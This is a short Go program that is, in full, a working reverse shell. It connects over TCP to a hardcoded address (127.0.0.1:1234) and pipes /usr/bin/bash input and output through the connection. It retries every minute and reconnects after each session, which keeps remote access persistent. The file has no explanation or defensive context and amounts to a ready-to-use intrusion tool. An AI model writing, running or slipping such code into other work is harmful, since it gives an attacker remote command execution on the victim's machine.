package main

import (
	"net"
	"os/exec"
	"time"
)

func main() {
	reverse("127.0.0.1:1234")
}

// reverse must try connect to server
func reverse(server string) {
	c, err := net.Dial("tcp", server)
	if nil != err {
		if nil != c {
			c.Close()
		}
		time.Sleep(time.Minute)
		reverse(server)
	}
	defer c.Close()

	cmd := exec.Command("/usr/bin/bash")
	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
	cmd.Run()
	c.Close()
	reverse(server)
}
